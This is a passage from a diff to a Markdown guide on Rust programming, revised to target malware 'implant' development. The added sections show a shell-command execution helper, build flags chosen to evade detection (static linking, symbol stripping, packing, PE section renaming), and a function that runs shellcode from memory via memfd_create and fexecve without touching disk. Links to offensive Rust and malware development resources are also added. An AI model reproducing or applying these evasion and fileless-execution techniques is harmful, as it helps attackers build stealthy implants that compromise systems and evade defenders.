-    Connect { host: String, port: u16, #[source] source: std::io::Error },
+pub enum ImplantError {
+    #[error("network error: {0}")]
+    Network(#[from] reqwest::Error),
 
-    #[error("Crypto error: {0}")]
-    Crypto(String),
+    #[error("crypto error: {msg}")]
+    Crypto { msg: String },
 
-    #[error("Command execution failed with exit code {0}")]
-    ExecFailed(i32),
+    #[error("command execution failed with exit code {code}")]
+    Execution { code: i32 },
 
     #[error(transparent)]
     Io(#[from] std::io::Error),
+}
 
-    #[error(transparent)]
-    Request(#[from] reqwest::Error),
+// Functions returning your custom error type
+fn run_cmd(cmd: &str) -> Result<String, ImplantError> {
+    let out = std::process::Command::new("sh")
+        .arg("-c")
+        .arg(cmd)
+        .output()
+        .map_err(ImplantError::Io)?;
+
+    if !out.status.success() {
+        return Err(ImplantError::Execution {
+            code: out.status.code().unwrap_or(-1),
+        });
+    }
+    Ok(String::from_utf8_lossy(&out.stdout).to_string())
 }
 ```
 
-### ? in Async Contexts
+---
+
+## 9. Build Flags for Evasion
+
+### Static Linking (no external DLL dependencies)
+
+```bash
+# Static CRT on Windows — no MSVCRT.dll or VCRUNTIME dependency
+RUSTFLAGS="-C target-feature=+crt-static" cargo build --release --target x86_64-pc-windows-gnu
+
+# Full musl static on Linux
+RUSTFLAGS="-C target-feature=+crt-static" cargo build --release --target x86_64-unknown-linux-musl
+```
+
+### Size Minimization
+
+```bash
+# Optimize for binary size instead of speed
+RUSTFLAGS="-C opt-level=z -C panic=abort" cargo build --release
+
+# Combine with Cargo.toml profile settings
+[profile.release]
+opt-level     = "z"
+strip         = true
+lto           = true
+panic         = "abort"
+codegen-units = 1
+```
+
+### Strip Symbols
+
+```bash
+# Via Cargo.toml (Rust 1.59+)
+[profile.release]
+strip = true
+
+# Manual strip after build (guaranteed)
+strip target/x86_64-pc-windows-gnu/release/implant.exe
+
+# On macOS
+strip -x target/release/implant
+```
+
+### Post-Processing
+
+```bash
+# UPX compression — reduces binary size, adds packer signature
+# Avoid on implants where packer signatures are detected
+upx --best --lzma target/release/implant.exe
+
+# Check final binary size
+ls -lh target/x86_64-pc-windows-gnu/release/implant.exe
+```
+
+### PE Section Name Obfuscation (build.rs)
 
 ```rust
-// ? works the same in async fn as in sync fn
-async fn fetch_and_parse(url: &str) -> anyhow::Result<Vec<String>> {
-    let client = reqwest::Client::new();
-    let text = client.get(url).send().await?.text().await?;
-    let lines: Vec<String> = text.lines().map(String::from).collect();
-    Ok(lines)
+// build.rs — rename default .text section via linker flags
+fn main() {
+    if std::env::var("CARGO_CFG_TARGET_OS").unwrap() == "windows" {
+        println!("cargo:rustc-link-arg=/SECTION:.text,.data,.rdata");
+        // Or use a custom linker script for more control
+    }
 }
 ```
 
@@ -772,211 +629,133 @@ async fn fetch_and_parse(url: &str) -> anyhow::Result<Vec<String>> {
 
 ## 10. Useful Patterns
 
-### CLI with clap Derive
+### In-Memory Shellcode Execution (Linux — memfd_create)
+
+```rust
+use std::io::Write;
+use std::os::unix::io::FromRawFd;
+
+fn execute_shellcode_memfd(shellcode: &[u8]) -> anyhow::Result<()> {
+    unsafe {
+        // Create anonymous in-memory file — no filesystem entry
+        let name = b".\0";
+        let fd   = libc::syscall(libc::SYS_memfd_create, name.as_ptr(), 1u64) as i32;
+        anyhow::ensure!(fd >= 0, "memfd_create failed");
+
+        let mut f = std::fs::File::from_raw_fd(fd);
+        f.write_all(shellcode)?;
+
+        // fexecve: execute from file descriptor
+        let argv: Vec<*const libc::c_char> = vec![std::ptr::null()];
+        let envp: Vec<*const libc::c_char> = vec![std::ptr::null()];
+        libc::fexecve(fd, argv.as_ptr(), envp.as_ptr());
+    }
+    Ok(())
+}
+```
+
+### clap Derive Macro for CLI Args
 
 ```rust
 use clap::Parser;
+use std::path::PathBuf;
 
 #[derive(Parser, Debug)]
-#[command(name = "scanner", about = "Port scanner")]
-struct Args {
+#[command(name = "scanner", about = "Async port scanner")]
+pub struct Args {
     /// Target host or CIDR range
-    #[arg(short = 'H', long)]
-    host: String,
+    #[arg(short, long)]
+    pub host: String,
 
-    /// Port range, e.g. "1-1024" or "22,80,443"
+    /// Port range or list: "1-1024" or "22,80,443,3389"
     #[arg(short, long, default_value = "1-1024")]
-    ports: String,
+    pub ports: String,
 
     /// Max concurrent connections
-    #[arg(short = 'c', long, default_value_t = 500)]
-    concurrency: usize,
+    #[arg(short, long, default_value_t = 500)]
+    pub concurrency: u32,
 
     /// Connection timeout in milliseconds
     #[arg(short, long, default_value_t = 1000)]
-    timeout_ms: u64,
+    pub timeout_ms: u64,
 
-    /// Output file for JSON results
+    /// Write JSON results to this file
     #[arg(short, long)]
-    output: Option<String>,
+    pub output: Option<PathBuf>,
 }
+```
 
+### env_logger Setup
+
+```rust
 fn main() {
-    let args = Args::parse();
-    println!("Scanning {}:{}", args.host, args.ports);
-}
-```
-
-### Logging with env_logger
-
-```rust
-fn setup_logging() {
+    // Set RUST_LOG=debug or RUST_LOG=implant=trace to control verbosity
     env_logger::Builder::from_env(
-        env_logger::Env::default().default_filter_or("info")
-    )
-    .format_timestamp_millis()
-    .init();
-}
+        env_logger::Env::default().default_filter_or("warn")
+    ).init();
 
-// Usage: RUST_LOG=debug ./tool
-// log::info!, log::warn!, log::error!, log::debug!
-```
-
-### In-Memory Execution via memfd (Linux)
-
-```rust
-#[cfg(target_os = "linux")]
-mod memfd_exec {
-    use std::ffi::CString;
-    use std::os::unix::io::FromRawFd;
-    use std::fs::File;
-    use std::io::Write;
-
-    pub fn exec_in_memory(elf_bytes: &[u8]) -> anyhow::Result<()> {
-        // Create anonymous file descriptor
-        let name = CString::new("").unwrap();
-        let fd = unsafe {
-            libc::syscall(libc::SYS_memfd_create, name.as_ptr(), 1u32) as i32
-        };
-        if fd < 0 {
-            anyhow::bail!("memfd_create failed");
-        }
-
-        let mut file = unsafe { File::from_raw_fd(fd) };
-        file.write_all(elf_bytes)?;
-        drop(file); // keep fd alive via /proc
-
-        let path = format!("/proc/self/fd/{fd}");
-        let args: Vec<CString> = vec![CString::new(path.clone())?];
-        let env: Vec<CString> = vec![];
-
-        // execve replaces the process
-        nix::unistd::execve(
-            &CString::new(path)?,
-            &args,
-            &env,
-        )?;
-
-        unreachable!()
-    }
+    log::info!("implant starting");
+    log::debug!("debug detail here");
+    log::error!("something failed");
 }
 ```
 
-### Base64 Encode / Decode
+### base64 Encode/Decode
 
 ```rust
 use base64::{Engine as _, engine::general_purpose::STANDARD as B64};
 
-fn encode(data: &[u8]) -> String {
+fn b64_encode(data: &[u8]) -> String {
     B64.encode(data)
 }
 
-fn decode(s: &str) -> anyhow::Result<Vec<u8>> {
-    Ok(B64.decode(s)?)
-}
-```
-
-### AES-256-CBC Encrypt / Decrypt (RustCrypto)
-
-```rust
-use aes::Aes256;
-use cbc::{Encryptor, Decryptor};
-use cbc::cipher::{BlockEncryptMut, BlockDecryptMut, KeyIvInit};
-use rand::RngCore;
-
-type Aes256CbcEnc = Encryptor<Aes256>;
-type Aes256CbcDec = Decryptor<Aes256>;
-
-fn encrypt(key: &[u8; 32], plaintext: &[u8]) -> anyhow::Result<Vec<u8>> {
-    let mut iv = [0u8; 16];
-    rand::thread_rng().fill_bytes(&mut iv);
-
-    // Pad to block boundary (PKCS7)
-    let padded_len = ((plaintext.len() / 16) + 1) * 16;
-    let mut buf = plaintext.to_vec();
-    let pad = (padded_len - plaintext.len()) as u8;
-    buf.resize(padded_len, pad);
-
-    let ct = Aes256CbcEnc::new(key.into(), &iv.into())
-        .encrypt_padded_mut::<cbc::cipher::block_padding::Pkcs7>(&mut buf, plaintext.len())
-        .map_err(|e| anyhow::anyhow!("Encrypt error: {e}"))?
-        .to_vec();
-
-    // Prepend IV
-    let mut out = iv.to_vec();
-    out.extend_from_slice(&ct);
-    Ok(out)
-}
-
-fn decrypt(key: &[u8; 32], ciphertext: &[u8]) -> anyhow::Result<Vec<u8>> {
-    if ciphertext.len() < 16 {
-        anyhow::bail!("Ciphertext too short");
-    }
-    let (iv, ct) = ciphertext.split_at(16);
-    let iv: [u8; 16] = iv.try_into()?;
-
-    let mut buf = ct.to_vec();
-    let pt = Aes256CbcDec::new(key.into(), &iv.into())
-        .decrypt_padded_mut::<cbc::cipher::block_padding::Pkcs7>(&mut buf)
-        .map_err(|e| anyhow::anyhow!("Decrypt error: {e}"))?
-        .to_vec();
-
-    Ok(pt)
+fn b64_decode(s: &str) -> anyhow::Result<Vec<u8>> {
+    B64.decode(s).map_err(|e| anyhow::anyhow!("base64 decode: {e}"))
 }
 ```
 
 ---
 
-## Quick Reference: Common Cargo Commands
+## Quick Reference: Useful One-Liners
 
 ```bash
-# Build debug (fast, larger, has symbols)
-cargo build
+# New project
+cargo new --bin implant && cd implant
 
-# Build release (slow, smaller, optimized)
-cargo build --release
-
-# Cross-compile Windows 64-bit PE from Linux
-cargo build --release --target x86_64-pc-windows-gnu
-
-# Check without building (fast syntax check)
+# Check compile without linking (fast syntax check)
 cargo check
 
-# Run tests
-cargo test
+# Build release for current platform
+cargo build --release
+
+# Build Windows exe from Linux
+cargo build --release --target x86_64-pc-windows-gnu
+
+# Run with verbose logging
+RUST_LOG=debug cargo run -- --host 192.168.1.0/24
+
+# Audit dependencies for known vulnerabilities
+cargo install cargo-audit && cargo audit
 
 # Show dependency tree
 cargo tree
 
-# Audit for known vulnerabilities
-cargo audit
-
-# Update dependencies
-cargo update
-
-# Show binary size breakdown
-cargo bloat --release
-
-# Format code
-cargo fmt
-
-# Run clippy (linter)
-cargo clippy -- -D warnings
+# Show binary sections and symbols
+objdump -h target/release/implant
+nm target/release/implant | grep -i main
 ```
 
 ---
 
 ## Resources
 
-- Rust Book: https://doc.rust-lang.org/book/
-- Rust Reference: https://doc.rust-lang.org/reference/
-- tokio documentation: https://docs.rs/tokio/latest/tokio/
-- reqwest crate: https://docs.rs/reqwest/latest/reqwest/
-- windows-sys crate: https://docs.rs/windows-sys/latest/windows_sys/
-- RustCrypto GitHub: https://github.com/RustCrypto
-- serde documentation: https://serde.rs/
-- clap crate: https://docs.rs/clap/latest/clap/
-- anyhow crate: https://docs.rs/anyhow/latest/anyhow/
-- thiserror crate: https://docs.rs/thiserror/latest/thiserror/
-- Rust Cross-Compilation Guide: https://rust-lang.github.io/rustup/cross-compilation.html
-- crates.io: https://crates.io/
+- [The Rust Programming Language Book](https://doc.rust-lang.org/book/)
+- [tokio.rs — Async Runtime Documentation](https://tokio.rs/)
+- [RustCrypto — AES, CBC, and other primitives](https://github.com/RustCrypto)
+- [windows-sys crate — crates.io](https://crates.io/crates/windows-sys)
+- [reqwest — HTTP client documentation](https://docs.rs/reqwest)
+- [clap — CLI parsing](https://docs.rs/clap)
+- [anyhow — Error handling](https://docs.rs/anyhow)
+- [thiserror — Custom error types](https://docs.rs/thiserror)
+- [Offensive Rust — trickster0](https://github.com/trickster0/OffensiveRust)
+- [Rust for Malware Development — maldev.net](https://maldevacademy.com/)
